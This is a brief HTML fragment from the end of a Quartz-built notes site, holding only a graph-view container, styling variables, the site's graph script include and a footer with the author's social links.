id=graph-container></div><style>:root{--g-node:var(--secondary);--g-node-active:var(--primary);--g-node-inactive:var(--visited);--g-link:var(--outlinegray);--g-link-active:#5a7282}</style><script src=https://hakbrain.xyz/js/graph.abd4bc2af3869a96524d7d23b76152c7.js></script></div></div><div id=contact_buttons><footer><p>Made by Vl@gh3 using <a href=https://github.com/jackyzha0/quartz>Quartz</a>, ¬© 2022</p><ul><li><a href=https://hakbrain.xyz/>Home</a></li><li><a href=https://twitter.com/vlaghe1>Twitter</a></li><li><a href=https://github.com/vlagh3>Github</a></li></ul></footer></div></div></body></html>